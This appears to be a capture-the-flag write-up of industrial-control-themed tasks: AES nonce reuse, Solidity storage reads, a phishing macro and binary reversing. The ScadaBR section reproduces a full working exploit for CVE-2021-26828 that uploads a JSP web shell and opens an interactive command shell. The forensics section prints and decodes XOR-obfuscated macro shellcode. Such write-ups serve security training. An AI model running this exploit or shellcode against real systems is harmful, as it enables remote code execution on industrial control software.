### Crypto 
1. #### Task 19 - No Salt, No Shame
    To “secure” the maintenance logs, Virelia’s gateway vendor encrypted every critical entry with AES-CBC—using the plant’s code name as the passphrase and a fixed, all-zero IV. Of course, without any salt or integrity checks, it’s only obscurity, not true security. Somewhere in those encrypted records lies the actual shutdown command.

    Passphrase: `VIRELIA-WATER-FAC`
    Download the encrypted log file attached to this task and get the flag!

    Solution:
    
    ```
    from Crypto.Cipher import AES
    from Crypto.Hash import SHA256

    def main():
        with open("shutdown.log-1750934543756.enc", "rb") as file_enc:
            cipher_text = file_enc.read()

            possible_pass= 'VIRELIA-WATER-FAC'
            key = SHA256.new(possible_pass.encode()).digest()

            iv = b'\x00' * 16
            cipher = AES.new(key, AES.MODE_CBC, iv)

            plaintext = cipher.decrypt(cipher_text)

            print(plaintext.decode(errors='ignore'))

    if __name__ == '__main__':
        main()
    ```

2. #### Task 20 - Echoed Streams
    Three months after the Virelia Water Control Facility was breached, OT traffic is finally back online—supposedly “fully remediated.” During a routine audit, Black Echo’s red team intercepted two back‐to‐back telemetry packets between a pump controller and the SCADA server. Curiously, both packets were encrypted under AES‐GCM using the same 16-byte nonce (number used once). The first packet is just regular facility telemetry; the second contains a hidden sabotage command with the kill-switch flag. Your job is to recover that flag and stop the attack.

    Each file is formatted as:
    `[16 bytes GCM nonce] ∥ [96 bytes ciphertext] ∥ [16 bytes GCM tag]`

    We know that the first plaintext (96 bytes) is the facility’s standard telemetry string, exactly:
    `BEGIN TELEMETRY VIRELIA;ID=ZTRX0110393939DC;PUMP1=OFF;VALVE1=CLOSED;PUMP2=ON;VALVE2=CLOSED;END;`

    The second packet follows the same format but carries the kill switch command and flag. We need you to decrypt the contents of cipher2.bin so that we can recover and disable the kill switch.

    Solution:
    
    ```
    def main():
        with open('cipher1.bin', 'rb') as file:
            cipher_txt_1 = file.read()
            
        with open('cipher2.bin', 'rb') as file:
            cipher_txt_2 = file.read()

        ctx_1 = cipher_txt_1[16:112]
        ctx_2 = cipher_txt_2[16:112]

        known_text = b'BEGIN TELEMETRY VIRELIA;ID=ZTRX0110393939DC;PUMP1=OFF;VALVE1=CLOSED;PUMP2=ON;VALVE2=CLOSED;END;'

        partial_plain_txt = bytes(a ^ b for a, b in zip(ctx_1, ctx_2))
        plaintext = bytes(a ^ b for a, b in zip(partial_plain_txt, known_text))

        print(plaintext.decode(errors='ignore'))

    if __name__ == '__main__':
        main()
    ```

###  Networking
1. #### Task 22 - Rogue Poller

### Web
1. #### Task 33 - IndustrialChain
Flicker has ghosted through your decentralised control logic quietly, reversing override conditions in your smart contract. The main switch appears engaged, but safety locks remain enforced at the contract level. Your mission: Reclaim manual control. 
Could you review the smart contract logic and execute the correct sequence to override the sabotage?

Solidity code:

```rust
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.8.19;

    contract Challenge {
        bool public emergencyShutdown = false;
        bool public systemActivated = false;
        bool public you_solved_it = false;
        address public operator;

        constructor() {
            operator = msg.sender;
        }

        function engageMainSwitch() external  returns (bool) {
            systemActivated = true;
            return true;
        }

        function pressOverrideButton() external  returns (bool) {
            require(systemActivated, "System not activated");
            you_solved_it = true;
            return true;
        }

        function isSolved() external view returns (bool) {
            return you_solved_it;
        }

        function checkSystem() external view returns (string memory) {
            if (you_solved_it) {
                return "System Online  Mission Accomplished!";
            } else if (systemActivated) {
                return "System Activated  Awaiting Override...";
            } else {
                return "System Offline Engage Main Switch";
            }
        }
    }
```

Interaction code:

```rust
    Goal: have the isSolved() function return true
    Status: DEPLOYED
    Player Balance: 0.999944948 ETH
    Player Wallet Address: 0x219EE75691596174612d5Fd4c675F06BA33630D3
    Private Key: 0x8958eb8470de602ffbd72a80fd9fd7297b4621629ab71996d40f4d4105b127f4
    Contract Address: 0x74dae0A0e456C8556525c7f16fB07CD9c25b2127
    Block Time: 0
    RPC URL: http://geth:8545
    Chain ID: 31337
```

Where *target address* is the address of the contract and *geth* is the ip address of the instance machine.

Solution:
`--legacy` was used due to => Error: unsupported feature: eip1559.

```rust
    $target = 0x74dae0A0e456C8556525c7f16fB07CD9c25b2127
    $pkey = 0x8958eb8470de602ffbd72a80fd9fd7297b4621629ab71996d40f4d4105b127f4

    cast send $target "engageMainSwitch()" --private-key $pkey --rpc-url http://10.10.154.205:8545 --legacy
    cast send $target 'pressOverrideButton()' --private-key $pkey --rpc-url http://10.10.154.205:8545 --legacy
```

2. #### Task 34 - Obscurity
The plant’s override relay was blockchain-governed. That is until Flicker embedded a sabotage handshake inside the contract’s state logic.Now, the machinery won’t respond unless the hidden sequence is re-executed.
Sensors are reading “Main switch: ON”, but nothing moves. Flicker’s smart contract ghost fork rewired state verification, hiding the real override behind two calls in just the right order.

Note: The VM takes about 4 minutes to boot up.

Solidity code:

```rust
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.8.19;

    contract Challenge {
        string private secret = "THM{}";
        bool private unlock_flag = false;
        uint256 private code;
        string private hint_text;
        
        constructor(string memory flag, string memory challenge_hint, uint256 challenge_code) {
            secret = flag;
            code = challenge_code;
            hint_text = challenge_hint;
        }
        
        function hint() external view returns (string memory) {
            return hint_text;
        }
        
        function unlock(uint256 input) external returns (bool) {
            if (input == code) {
                unlock_flag = true;
                return true;
            }
            return false;
        }
        
        function isSolved() external view returns (bool) {
            return unlock_flag;
        }
        
        function getFlag() external view returns (string memory) {
            require(unlock_flag, "Challenge not solved yet");
            return secret;
        }
    }
```

Interaction code:

```rust
    Goal: have the isSolved() function return true
    Status: DEPLOYED
    Player Balance: 0.999908107 ETH
    Player Wallet Address: 0x66A72d0502429fE5b535f8CA86EeB3c98D7769c9
    Private Key: 0xf0405ec2170a2111a1a9144168a152baea149e82d400ee06dccc8a7bea86b1bb
    Contract Address: 0x74dae0A0e456C8556525c7f16fB07CD9c25b2127
    Block Time: 0
    RPC URL: http://geth:8545
    Chain ID: 31337
```

Where *target address* is the address of the contract and *geth* is the ip address of the instance machine.

Solution:
Is necesary to know the code to unlock the flag. The code is the last 6 digits of the private key. That is posible, we can se the *slots*.
`--legacy` was used due to => Error: unsupported feature: eip1559.

```rust
    $target = 0x74dae0A0e456C8556525c7f16fB07CD9c25b2127
    $pkey = 0xf0405ec2170a2111a1a9144168a152baea149e82d400ee06dccc8a7bea86b1bb

        string private secret = "THM{}";  => slot 0
        bool private unlock_flag = false; => slot 1
        uint256 private code;             => slot 2
        string private hint_text;         => slot 3

    cast storage $target 2 --rpc-url http://10.10.104.195:8545
        => 0x0000000000000000000000000000000000000000000000000000000000001a7a

    print(0x1a7a)
        => 6778

    cast call $target 'unlock(uint256)' 6778 --rpc-url http://10.10.104.195:8545 --legacy
    cast call $target 'isSolved()' --rpc-url http://10.10.104.195:8545 --legacy
    cast call $target 'getFlag()' --rpc-url http://10.10.104.195:8545
```

3. #### Task 10 - Brr v1
A forgotten HMI node deep in Virelia’s wastewater control loop still runs an outdated instance, forked from an old Mango M2M stack. 

Note: The VM takes about 3 minutes to boot up.

Solution:
The ScadaBR use the default credentials `admin:admin`.
```rust
#!/usr/bin/env python3

import requests
import sys
import time

if len(sys.argv) <= 4:
    print('[x] Missing arguments ... ')
    print('[>] Usage: python3 WinScada_RCE.py <TargetIp> <TargetPort> <User> <Password>')
    print('[>] Example: python3 WinScada_RCE.py 192.168.1.24 8080 admin admin')
    sys.exit(0)
else:
    time.sleep(1)

host = sys.argv[1]
port = sys.argv[2]
user = sys.argv[3]
passw = sys.argv[4]

flag = False
LOGIN = f'http://{host}:{port}/ScadaBR/login.htm'
PROTECTED_PAGE = f'http://{host}:{port}/ScadaBR/view_edit.shtm'

banner = '''
+-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-+
|    _________                  .___     ____________________       |
|   /   _____/ ____ _____     __| _/____ \\______   \______   \      |
|   \_____  \_/ ___\\__  \   / __ |\__  \ |    |  _/|       _/       |
|   /        \  \___ / __ \_/ /_/ | / __ \|    |   \|    |   \      |
|  /_______  /\___  >____  /\____ |(____  /______  /|____|_  /      |
|          \/     \/     \/      \/     \/       \/        \/       |
|                                                                   |
|    > ScadaBR 1.0 ~ 1.1 CE Arbitrary File Upload (CVE-2021-26828)  |
|    > Exploit Author : Fellipe Oliveira  			    |
|    > Exploit for Windows Systems                                  |
+-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-+
'''

def main():
    payload = {
        'username': user,
        'password': passw
    }

    print(banner)
    time.sleep(2)

    with requests.session() as s:
        print(f"[+] Trying to authenticate {LOGIN}...")
        s.post(LOGIN, data=payload)
        response = s.get(PROTECTED_PAGE)

        if response.status_code == 200:
            print("[+] Successfully authenticated! :D~\n")
            time.sleep(2)
        else:
            print("[x] Authentication failed :(")
            sys.exit(0)

        # Upload payload
        burp0_url = f"http://{host}:{port}/ScadaBR/view_edit.shtm"
        burp0_headers = {
            "User-Agent": "Mozilla/5.0",
            "Content-Type": "multipart/form-data; boundary=---------------------------6150838712847095098536245849"
        }

        jsp_payload = '''<%@ page import="java.util.*,java.io.*"%>
<%
%>
<HTML><BODY>
Commands with JSP
<FORM METHOD="GET" NAME="myform" ACTION="">
<INPUT TYPE="text" NAME="cmd">
<INPUT TYPE="submit" VALUE="Send">
</FORM>
<pre>
<%
if (request.getParameter("cmd") != null) {
    out.println("Command: " + request.getParameter("cmd") + "<BR>");
    Process p;
    if (System.getProperty("os.name").toLowerCase().indexOf("windows") != -1){
        p = Runtime.getRuntime().exec("cmd.exe /C " + request.getParameter("cmd"));
    }
    else{
        p = Runtime.getRuntime().exec(request.getParameter("cmd"));
    }
    OutputStream os = p.getOutputStream();
    InputStream in = p.getInputStream();
    DataInputStream dis = new DataInputStream(in);
    String disr = dis.readLine();
    while (disr != null) {
        out.println(disr);
        disr = dis.readLine();
    }
}
%>
</pre>
</BODY></HTML>'''

        # Craft raw multipart/form-data body
        burp0_data = (
            "-----------------------------6150838712847095098536245849\r\n"
            "Content-Disposition: form-data; name=\"view.name\"\r\n\r\n\r\n"
            "-----------------------------6150838712847095098536245849\r\n"
            "Content-Disposition: form-data; name=\"view.xid\"\r\n\r\nGV_218627\r\n"
            "-----------------------------6150838712847095098536245849\r\n"
            "Content-Disposition: form-data; name=\"backgroundImageMP\"; filename=\"win_cmd.jsp\"\r\n"
            "Content-Type: application/octet-stream\r\n\r\n"
            f"{jsp_payload}\r\n"
            "-----------------------------6150838712847095098536245849\r\n"
            "Content-Disposition: form-data; name=\"upload\"\r\n\r\nUpload image\r\n"
            "-----------------------------6150838712847095098536245849\r\n"
            "Content-Disposition: form-data; name=\"view.anonymousAccess\"\r\n\r\n0\r\n"
            "-----------------------------6150838712847095098536245849--\r\n"
        )

        print('[>] Attempting to upload .jsp Webshell...')
        getdata = s.post(burp0_url, headers=burp0_headers, data=burp0_data.encode())
        time.sleep(1)
        print('[>] Verifying shell upload...\n')
        time.sleep(2)

        if getdata.status_code == 200:
            print('[+] Upload Successfully!')
            for num in range(1, 500):
                PATH = f'http://{host}:{port}/ScadaBR/uploads/{num}.jsp'
                find = s.get(PATH)
                if find.status_code == 200:
                    print(f'[+] Webshell Found in: {PATH}')
                    flag = True
                    print('[>] Spawning fake shell...')
                    time.sleep(3)

                    while flag:
                        try:
                            param = input("# ")
                            if param.strip().lower() in ['exit', 'quit']:
                                flag = False
                                break
                            shell_url = f"{PATH}?cmd={param}"
                            shell_response = s.get(shell_url)
                            clean = shell_response.text \
                                .replace('<pre>', '') \
                                .replace('<FORM METHOD=', '') \
                                .replace('<HTML><BODY>', '') \
                                .replace('"GET" NAME="myform" ACTION="">', '') \
                                .replace('Commands with JSP', '') \
                                .replace('<INPUT TYPE="text" NAME="cmd">', '') \
                                .replace('<INPUT TYPE="submit" VALUE="Send">', '') \
                                .replace('</FORM>', '') \
                                .replace('<BR>', '\n') \
                                .replace('</pre>', '') \
                                .replace('</BODY></HTML>', '')
                            print(clean.strip())
                        except KeyboardInterrupt:
                            print("\n[x] Exiting shell...")
                            flag = False
                            break
                    break

                elif num == 499:
                    print('[x] Webshell not Found')
        else:
            print('Reason: ' + getdata.reason)
            print('Exploit Failed x_x')


if __name__ == '__main__':
    main()
```

### Forensics
1. #### Task 13 - Orcam
Dr. Ayaka Hirano loves to swim with the sharks. So when the attackers from Virelia successfully retaliated against one of our own, it was up to the good doctor to take on the case. Will Dr. Hirano be able to determine how this attack happened in the first place? Press the Start Machine button at the top of the task to launch the VM. The VM will start in a split-screen view. If the VM is not visible, then you can press the Show Split View button at the top of the page.

Solution:
Is necessary download the *writing_template.eml* file and open it with a text editor.

```rust
    Content-Disposition: attachment; filename="Project_Template.docm"

    UEsDBBQABgAIAAAAIQAdUTTz7AEAAHsKAAATAAgCW0NvbnRlbnRfVHlwZXNdLnhtbCCiBAIooAAC
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

A word file there incrust into this file, remove all extra data and only conserve the *base64* data. Create a new *docm* file: `cat writing_template.eml | base64 -d > Project_Template.docm`. Previously we are able to see one phrase: **Please use the following template for the upcoming Project. The file will not work unless you open it using administrative privileges. When prompted, enable macros in order to get all of the details.**. To extract macros: `olevba Project_Template.doc`.

```
    buf = Array(144, 219, 177, 116, 108, 51, 83, 253, 137, 2, 243, 16, 231, 99, 3, 255, 62, 63, 184, 38, 120, 184, 65, 92, 99, 132, 121, 82, 93, 204, 159, 72, 13, 79, 49, 88, 76, 242, 252, 121, 109, 244, 209, 134, 62, 100, 184, 38, 124, 184, 121, 72, 231, 127, 34, 12, 143, 123, 50, 165, 61, 184, 106, 84, 109, 224, 184, 61, 116, 208, 9, 61, 231, 7, 184, 117, 186, 2, 204, 216, 173, _
    252, 62, 117, 171, 11, 211, 1, 154, 48, 78, 140, 87, 78, 23, 1, 136, 107, 184, 44, 72, 50, 224, 18, 231, 63, 120, 255, 52, 47, 50, 167, 231, 55, 184, 117, 188, 186, 119, 80, 72, 104, 104, 21, 53, 105, 98, 139, 140, 108, 108, 46, 231, 33, 216, 249, 49, 89, 50, 249, 233, 129, 51, 116, 108, 99, 91, 69, 231, 92, 180, 139, 185, 136, 211, 105, 70, 57, 91, 210, 249, _
    142, 174, 139, 185, 15, 53, 8, 102, 179, 200, 148, 25, 54, 136, 51, 127, 65, 92, 30, 108, 96, 204, 161, 2, 86, 71, 84, 25, 64, 86, 6, 76, 82, 87, 25, 5, 93, 90, 7, 24, 65, 65, 21, 24, 92, 65, 84, 58, 118, 91, 58, 9, 3, 101, 70, 33, 100, 75, 18, 56, 102, 113, 48, 15, 89, 113, 77, 76, 28, 82, 16, 8, 19, 28, 45, 76, 21, 19, 26, 9, _
    71, 19, 24, 3, 80, 82, 24, 11, 65, 92, 1, 28, 19, 82, 16, 1, 90, 93, 29, 31, 71, 65, 21, 24, 92, 65, 7, 76, 82, 87, 25, 5, 93, 90, 7, 24, 65, 65, 21, 24, 92, 65, 84, 67, 82, 87, 16, 108)

    For i = 0 To UBound(buf)
        buf(i) = buf(i) Xor Asc("l33t")
    Next i
```

```rust
    buf = [
        144, 219, 177, 116, 108, 51, 83, 253, 137, 2, 243, 16, 231, 99, 3, 255, 62, 63, 184, 38, 120, 184, 65, 92, 99, 132, 121, 82, 93, 204, 159, 72, 13, 79, 49, 88, 76, 242, 252, 121, 109, 244, 209, 134, 62, 100, 184, 38, 124, 184, 121, 72, 231, 127, 34, 12, 143, 123, 50, 165, 61, 184, 106, 84, 109, 224, 184, 61, 116, 208, 9, 61, 231, 7, 184, 117, 186, 2, 204, 216, 173, 252, 62, 117, 171, 11, 211, 1, 154, 48, 78, 140, 87, 78, 23, 1, 136, 107, 184, 44, 72, 50, 224, 18, 231, 63, 120, 255, 52, 47, 50, 167, 231, 55, 184, 117, 188, 186, 119, 80, 72, 104, 104, 21, 53, 105, 98, 139, 140, 108, 108, 46, 231, 33, 216, 249, 49, 89, 50, 249, 233, 129, 51, 116, 108, 99, 91, 69, 231, 92, 180, 139, 185, 136, 211, 105, 70, 57, 91, 210, 249, 142, 174, 139, 185, 15, 53, 8, 102, 179, 200, 148, 25, 54, 136, 51, 127, 65, 92, 30, 108, 96, 204, 161, 2, 86, 71, 84, 25, 64, 86, 6, 76, 82, 87, 25, 5, 93, 90, 7, 24, 65, 65, 21, 24, 92, 65, 84, 58, 118, 91, 58, 9, 3, 101, 70, 33, 100, 75, 18, 56, 102, 113, 48, 15, 89, 113, 77, 76, 28, 82, 16, 8, 19, 28, 45, 76, 21, 19, 26, 9, 71, 19, 24, 3, 80, 82, 24, 11, 65, 92, 1, 28, 19, 82, 16, 1, 90, 93, 29, 31, 71, 65, 21, 24, 92, 65, 7, 76, 82, 87, 25, 5, 93, 90, 7, 24, 65, 65, 21, 24, 92, 65, 84, 67, 82, 87, 16, 108
    ]

    key = 'l33t'
    decoded_buf = []

    for i in range(len(buf)):
        decoded_byte = buf[i] ^ ord(key[i % len(key)])
        decoded_buf.append(decoded_byte)

    shellcode = bytes(decoded_buf)

    with open('shell.bin', 'wb') as file:
        file.write(shellcode)
```

### Reversing
1. #### Task 24 - Auth
ZeroTrace intercepts a stripped-down authentication module running on a remote industrial gateway. Assembly scrolls across glowing monitors as she unpacks the logic behind the plant’s digital checkpoint.

Files (materials) => Download

Solution:
We can se the code, *local_160* that is compared with *local_168* if both are same the code is correct. The code is a hexadecimal: `efcdab8967452301`, but all hexadecimal numbers are inverted **(Little Endian)**.

Main function:

```rust
    local_160 = 0xefcdab8967452301;
    printf("[?] Enter unlock code: ");

    if (sVar4 == 8) {
        local_168 = local_158[0];
        transform(&local_168,8);
        iVar1 = memcmp(&local_168,&local_160,8);
        if (iVar1 == 0) {
            __stream = fopen("flag.txt","r");
```

Transform function:

```rust
    void transform(long param_1,ulong param_2) {
        undefined8 local_10;
        
        for (local_10 = 0; local_10 < param_2; local_10 = local_10 + 1) {
            *(byte *)(local_10 + param_1) = *(byte *)(local_10 + param_1) ^ 0x55;
        }
        return;
    }
```

Solve code:

```rust
    def main():
        code = bytes.fromhex('efcdab8967452301')[::-1]
        decoded_code = bytes([x ^ 0x55 for x in code])
        print(decoded_code)

    if __name__ == '__main__':
        main()
```

Finally we have to send the code using nc: `print 'Tv\x102\xdc\xfe\x98\xba' | nc 10.10.4.158 9005`

2. #### Task 25 - Access Granted
ZeroTrace intercepts a suspicious HMI login module on the plant floor. Reverse the binary logic to reveal the access key and slip past digital defences.

Files (materials) => Download

Solution:
Using *bninja* we can se directly the password: *industrial*. This string is compared with our input if they are the same the flag is printed. Verifing that information we found the variable:
- `char pass[0xb] = "industrial"`

```rust
    void* fsbase
    int64_t rax = *(fsbase + 0x28)
    setvbuf(fp: __TMC_END__, buf: nullptr, mode: 2, size: 0)
    setvbuf(fp: stdin, buf: nullptr, mode: 2, size: 0)
    printf(format: "Enter the password : ")
    void buf
    read(fd: 0, &buf, nbytes: 0x1f)
    printf(format: "\nprocessing...")

    if (strncmp("industrial", &buf, 0xa) != 0)
        puts(str: "\nWrong Password!")
    else
        puts(str: "Access Granted!")
        print_flag()

    if (rax == *(fsbase + 0x28))
        return 0

    __stack_chk_fail()
    noreturn
```

Solve code:
Finally we have to send the password using nc: `print 'industrial' | nc 10.10.168.91 9009`

3. #### Task 26 - Simple Protocol
Amid whirring routers and blinking panel lights, ZeroTrace dissects a custom network protocol linking industrial subsystems. Patterns in the packet flow hint at secrets embedded deep within machine chatter.

Files (materials) => Download

Solution:
The first lines of code show suggest that the target wait a connection through **TCP** using sockets.

```rust
    printf("Listening on port %d\n",0x115c);
    local_70 = accept(local_74,&local_28,&local_78);
    if (local_70 < 0) {
      perror("accept");
      exit(1);
    }

    puts("Connection received.");
    local_58 = recv(local_70,&local_44,0xc,0x100);
    if (local_58 != 0xc) {
      fwrite("Failed to receive header.\n",1,0x1a,stderr);
      exit(1);
    }
```

The most important code is the next, the target wait a checksum of the header which is calculated so: `local_64 = local_68 & 0xffff | (uint)(uVar2 ^ uVar1) << 0x10;`.

```rust
    uVar1 = ntohs(local_44);
    uVar2 = ntohs(local_42);
    local_6c = ntohl(local_40);
    local_68 = ntohl(local_3c);
    local_64 = local_68 & 0xffff | (uint)(uVar2 ^ uVar1) << 0x10;

    if (local_6c != local_64) {
      fwrite("Checksum validation failed.\n",1,0x1c,stderr);
      exit(1);
    }

    local_58 = recv(local_70,&local_4c,8,0x100);
    if (local_58 != 8) {
      fwrite("Failed to receive body metadata.\n",1,0x21,stderr);
      exit(1);
    }

    local_60 = ntohl(local_4c);
    local_5c = ntohl(local_48);
    if (local_60 != local_68) {
      fwrite("Body payload_id does not match header.\n",1,0x27,stderr);
      exit(1);
    }

    if (0x40 < local_5c) {
      fwrite("Payload size too large.\n",1,0x18,stderr);
      exit(1);
    }

    if (uVar2 == 0x100) { /* 256 */
      FUN_00101421(local_70);
    }
```

To calculate the checksum we need some variables:
- `uVar1 = 0x000`
- `uVar2 = 0x100`
- `local_68 = 0x12345678`
- `local_60 = local_68`
- `local_5c = 0x00000000`

`uVar1` no exist in the code, so for this we can asign a any value of 0, respecting the type **uint16** *(2 bytes)*.
`uVar2` is `0x100` *(256)*, is necessary this value because the conditional that print the flag validate this condition: `if(uVar2 == 0x100) {...}`.
`local_68` no exist, so for this we can asign a any value of 0, respecting the type **uint32** *(4 bytes)*.
`local_60` is compared with `local_68`, so we can asign the same content: `if(local_60 != local_68) {...}`, respecting the type **uint32** *(4 bytes)*.
`local_5c` is less than `0x40` *(64)*, the size of the payload, so we can asign a value between 0 and 64: `if(0x40 < local_5c) {...}`, respecting the type **uint32** *(4 bytes)*.

```rust
    uVar1 = 0x123
    uVar2 = 0x100
    local_68 = 0x12345678
    local_64 = (local_68 & 0xffff) | ((uVar2 ^ uVar1) << 0x10)
```

The nex is create the header and body of the packet.

```rust
    header = struct.pack('!HHII', uVar1, uVar2, local_64, local_68)

    local_60 = local_68
    local_5c = 0x00000000

    body = struct.pack('!II', local_68, local_5c)

    conn.sendall(header + body)
    response = conn.recv(1024)
    
    print(response.decode())

    conn.close()
```

Solve code:

```rust
    import socket 
    import struct

    def main():
        ip = '10.10.138.200'
        port = 4444

        conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        conn.connect((ip, port)) 

        uVar1 = 0x123; # No existing
        uVar2 = 0x100;
        local_68 = 0x12345678; # Fill with your own value
        local_64 = (local_68 & 0xffff) | ((uVar2 ^ uVar1) << 0x10)

        header = struct.pack('!HHII', uVar1, uVar2, local_64, local_68)

        # H => 2 bytes | uint16_t
        # I => 4 bytes | uint32_t
        
        local_60 = local_68;
        local_5c = 0x00000000; # Pyload size 0-64

        body = struct.pack('!II', local_60, local_5c)

        conn.sendall(header + body)
        response = conn.recv(1024)
        
        print(response.decode())

        conn.close()
        
    if __name__ == '__main__':
        main()
```

1. #### Task 27 - Protocol